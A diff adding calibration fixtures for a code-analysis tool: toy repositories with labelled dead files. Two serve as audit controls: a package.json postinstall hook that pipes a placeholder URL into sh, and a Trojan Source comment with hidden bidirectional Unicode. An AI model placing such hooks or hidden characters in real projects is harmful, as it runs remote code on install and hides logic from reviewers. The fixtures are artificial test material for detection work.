@@ -1,0 +1,304 @@
+# Fully annotated fixture repositories for `codedna calibration --fixtures`.
+#
+# Every file in a fixture is either listed with `@@@ dead` (nothing in the
+# program, its tests or its tooling uses it) or is in use. That makes dead-code
+# recall exact here, unlike on real repositories where only findings were
+# labelled. `@@@ audit CHECK FILE` is a positive control: the audit must report
+# CHECK in FILE.
+#
+# Format: `@@@ fixture NAME`, `@@@ about TEXT`, `@@@ dead PATH`,
+# `@@@ audit CHECK PATH`, `@@@ file PATH` followed by the file's lines up to the
+# next `@@@` line. Lines starting with `#` before the first fixture are comments.
+#
+# Write the truth from what the code does, not from what CodeDna reports.
+
+@@@ fixture ts-vite-react
+@@@ about Vite + React app with a path alias, type-only imports, a test and an unused chain
+@@@ dead src/components/Banner.tsx
+@@@ dead src/hooks/useOldCart.ts
+@@@ dead src/lib/legacyCurrency.ts
+@@@ file package.json
+{ "name": "shop", "private": true, "type": "module",
+  "scripts": { "dev": "vite", "build": "vite build", "test": "vitest" },
+  "dependencies": { "react": "^18.2.0", "react-dom": "^18.2.0" },
+  "devDependencies": { "vite": "^5.0.0", "vitest": "^1.0.0", "typescript": "^5.0.0" } }
+@@@ file index.html
+<!doctype html><html><body><div id="root"></div><script type="module" src="/src/main.tsx"></script></body></html>
+@@@ file tsconfig.json
+{ "compilerOptions": { "jsx": "react-jsx", "module": "ESNext", "moduleResolution": "bundler",
+  "baseUrl": ".", "paths": { "@/*": ["src/*"] } } }
+@@@ file vite.config.ts
+import { defineConfig } from 'vite';
+export default defineConfig({ resolve: { alias: { '@': '/src' } } });
+@@@ file src/main.tsx
+import { createRoot } from 'react-dom/client';
+import { App } from './App';
+createRoot(document.getElementById('root')!).render(<App />);
+@@@ file src/App.tsx
+import { Cart } from '@/components/Cart';
+import { formatPrice } from './lib/format';
+import type { Product } from './types';
+const items: Product[] = [];
+export function App() { return <Cart total={formatPrice(items.length)} />; }
+@@@ file src/components/Cart.tsx
+export function Cart({ total }: { total: string }) { return <p>{total}</p>; }
+@@@ file src/components/Banner.tsx
+export function Banner() { return <div>Sale</div>; }
+@@@ file src/lib/format.ts
+export const formatPrice = (n: number) => `$${n.toFixed(2)}`;
+@@@ file src/lib/format.test.ts
+import { formatPrice } from './format';
+import { test, expect } from 'vitest';
+test('formats', () => expect(formatPrice(1)).toBe('$1.00'));
+@@@ file src/lib/legacyCurrency.ts
+export function toCents(n: number) { return Math.round(n * 100); }
+@@@ file src/types.ts
+export interface Product { id: string; price: number }
+@@@ file src/hooks/useOldCart.ts
+import { toCents } from '../lib/legacyCurrency';
+export function useOldCart() { return toCents(1); }
+
+@@@ fixture node-cli
+@@@ about CommonJS package with a bin, main, tests, a computed require and unused helpers
+@@@ dead lib/util/colors.js
+@@@ dead lib/old-config.js
+@@@ audit install-script package.json
+@@@ file package.json
+{ "name": "tidy", "version": "1.0.0", "main": "lib/index.js", "bin": { "tidy": "bin/tidy.js" },
+  "scripts": { "test": "node --test test/", "postinstall": "curl -fsSL https://get.example.invalid/setup.sh | sh" } }
+@@@ file bin/tidy.js
+#!/usr/bin/env node
+const { run } = require('../lib/index');
+run(process.argv.slice(2));
+@@@ file lib/index.js
+const { clean } = require('./clean');
+const commands = { clean };
+function run(args) { return commands[args[0]] ? commands[args[0]](args.slice(1)) : null; }
+module.exports = { run };
+@@@ file lib/clean.js
+const { log } = require('./util/log');
+exports.clean = (files) => files.forEach((f) => log(f));
+@@@ file lib/util/log.js
+exports.log = (m) => console.log(m);
+@@@ file lib/util/colors.js
+exports.red = (s) => `\u001b[31m${s}\u001b[0m`;
+@@@ file lib/old-config.js
+module.exports = { retries: 3 };
+@@@ file test/clean.test.js
+const test = require('node:test');
+const { clean } = require('../lib/clean');
+test('clean', () => clean([]));
+
+@@@ fixture python-package
+@@@ about Python package with a console script, relative imports, a test and an unused module chain
+@@@ dead weather/cache_v1.py
+@@@ dead weather/legacy/__init__.py
+@@@ dead weather/legacy/sync.py
+@@@ file pyproject.toml
+[project]
+name = "weather"
+version = "0.1.0"
+
+[project.scripts]
+weather = "weather.cli:main"
+@@@ file weather/__init__.py
+from .client import Client
+
+__all__ = ["Client"]
+@@@ file weather/cli.py
+import argparse
+
+from weather.client import Client
+from weather.units import to_celsius
+
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument("city")
+    a = p.parse_args()
+    print(to_celsius(Client().temp(a.city)))
+@@@ file weather/client.py
+from .http import get
+
+
+class Client:
+    def temp(self, city):
+        return get(f"/t/{city}")["f"]
+@@@ file weather/http.py
+def get(path):
+    return {"f": 50}
+@@@ file weather/units.py
+def to_celsius(f):
+    return (f - 32) * 5 / 9
+@@@ file weather/cache_v1.py
+_store = {}
+
+
+def put(k, v):
+    _store[k] = v
+@@@ file weather/legacy/__init__.py
+@@@ file weather/legacy/sync.py
+from weather.cache_v1 import put
+
+
+def sync():
+    put("a", 1)
+@@@ file tests/test_units.py
+from weather.units import to_celsius
+
+
+def test_freezing():
+    assert to_celsius(32) == 0
+
+@@@ fixture rust-binary
+@@@ about Rust binary with modules declared from main.rs and one file no `mod` declares
+@@@ dead src/export_csv.rs
+@@@ file Cargo.toml
+[package]
+name = "ledger"
+version = "0.1.0"
+edition = "2021"
+@@@ file src/main.rs
+mod account;
+mod report;
+
+fn main() {
+    let a = account::Account::new();
+    println!("{}", report::render(&a));
+}
+@@@ file src/account.rs
+pub struct Account {
+    pub balance: i64,
+}
+
+impl Account {
+    pub fn new() -> Self {
+        Account { balance: 0 }
+    }
+}
+@@@ file src/report.rs
+use crate::account::Account;
+
+pub fn render(a: &Account) -> String {
+    format!("{}", a.balance)
+}
+@@@ file src/export_csv.rs
+pub fn to_csv(rows: &[i64]) -> String {
+    rows.iter().map(|r| r.to_string()).collect::<Vec<_>>().join(",")
+}
+
+@@@ fixture express-api
+@@@ about Express API with routes, middleware, services and models, plus an unused route and model
+@@@ dead src/routes/legacy.js
+@@@ dead src/models/AuditLog.js
+@@@ file package.json
+{ "name": "api", "version": "1.0.0", "main": "src/server.js",
+  "scripts": { "start": "node src/server.js" },
+  "dependencies": { "express": "^4.18.0", "pg": "^8.11.0" } }
+@@@ file src/server.js
+const express = require('express');
+const users = require('./routes/users');
+const { auth } = require('./middleware/auth');
+const app = express();
+app.use(auth);
+app.use('/users', users);
+app.listen(3000);
+@@@ file src/routes/users.js
+const { Router } = require('express');
+const { listUsers } = require('../services/userService');
+const router = Router();
+router.get('/', async (req, res) => res.json(await listUsers()));
+module.exports = router;
+@@@ file src/routes/legacy.js
+const { Router } = require('express');
+const { AuditLog } = require('../models/AuditLog');
+const router = Router();
+router.get('/', (req, res) => res.json(AuditLog.all()));
+module.exports = router;
+@@@ file src/middleware/auth.js
+exports.auth = (req, res, next) => (req.headers.authorization ? next() : res.sendStatus(401));
+@@@ file src/services/userService.js
+const { User } = require('../models/User');
+exports.listUsers = () => User.all();
+@@@ file src/models/User.js
+const { query } = require('../db');
+exports.User = { all: () => query('select * from users') };
+@@@ file src/models/AuditLog.js
+const { query } = require('../db');
+exports.AuditLog = { all: () => query('select * from audit_log') };
+@@@ file src/db.js
+const { Pool } = require('pg');
+const pool = new Pool();
+exports.query = (sql) => pool.query(sql).then((r) => r.rows);
+
+@@@ fixture nextjs-app-router
+@@@ about Next.js app router: pages, layouts and route handlers are entries; a dynamic import and an unused component
+@@@ dead components/OldHero.tsx
+@@@ dead lib/analytics-v1.ts
+@@@ file package.json
+{ "name": "site", "private": true,
+  "scripts": { "dev": "next dev", "build": "next build" },
+  "dependencies": { "next": "^14.2.0", "react": "^18.2.0", "react-dom": "^18.2.0" } }
+@@@ file tsconfig.json
+{ "compilerOptions": { "jsx": "preserve", "baseUrl": ".", "paths": { "@/*": ["./*"] } } }
+@@@ file next.config.js
+module.exports = { reactStrictMode: true };
+@@@ file app/layout.tsx
+import { Nav } from '@/components/Nav';
+export default function RootLayout({ children }: { children: React.ReactNode }) {
+  return <html><body><Nav />{children}</body></html>;
+}
+@@@ file app/page.tsx
+import dynamic from 'next/dynamic';
+const Chart = dynamic(() => import('../components/Chart'));
+export default function Home() { return <Chart />; }
+@@@ file app/blog/[slug]/page.tsx
+import { getPost } from '@/lib/posts';
+export default async function Post({ params }: { params: { slug: string } }) {
+  const post = await getPost(params.slug);
+  return <article>{post.title}</article>;
+}
+@@@ file app/api/health/route.ts
+export function GET() { return Response.json({ ok: true }); }
+@@@ file components/Nav.tsx
+export function Nav() { return <nav>Home</nav>; }
+@@@ file components/Chart.tsx
+export default function Chart() { return <svg />; }
+@@@ file components/OldHero.tsx
+import { track } from '@/lib/analytics-v1';
+export function OldHero() { track('hero'); return <h1>Hi</h1>; }
+@@@ file lib/posts.ts
+export async function getPost(slug: string) { return { title: slug }; }
+@@@ file lib/analytics-v1.ts
+export function track(event: string) { console.log(event); }
+
+@@@ fixture ts-workspaces
+@@@ about npm workspaces: an app imports a sibling package by name; one package export and one package are unused
+@@@ dead packages/ui/src/Tooltip.ts
+@@@ dead packages/legacy-utils/src/index.ts
+@@@ audit hidden-unicode apps/web/src/greeting.ts
+@@@ file package.json
+{ "name": "mono", "private": true, "workspaces": ["apps/*", "packages/*"] }
+@@@ file apps/web/package.json
+{ "name": "web", "private": true, "main": "src/index.ts", "dependencies": { "@mono/ui": "*" } }
+@@@ file apps/web/src/index.ts
+import { Button } from '@mono/ui';
+import { greeting } from './greeting';
+console.log(Button(greeting()));
+@@@ file apps/web/src/greeting.ts
+export function greeting() {
+  const role = "user"; // ‮ } if (role === "admin") { ⁦
+  return `hello ${role}`;
+}
+@@@ file packages/ui/package.json
+{ "name": "@mono/ui", "version": "1.0.0", "main": "src/index.ts" }
+@@@ file packages/ui/src/index.ts
+export { Button } from './Button';
+@@@ file packages/ui/src/Button.ts
+export const Button = (label: string) => `[${label}]`;
+@@@ file packages/ui/src/Tooltip.ts
+export const Tooltip = (text: string) => `(${text})`;
+@@@ file packages/legacy-utils/package.json
+{ "name": "@mono/legacy-utils", "private": true, "version": "0.1.0", "main": "src/index.ts" }
+@@@ file packages/legacy-utils/src/index.ts
+export const pad = (s: string) => ` ${s} `;
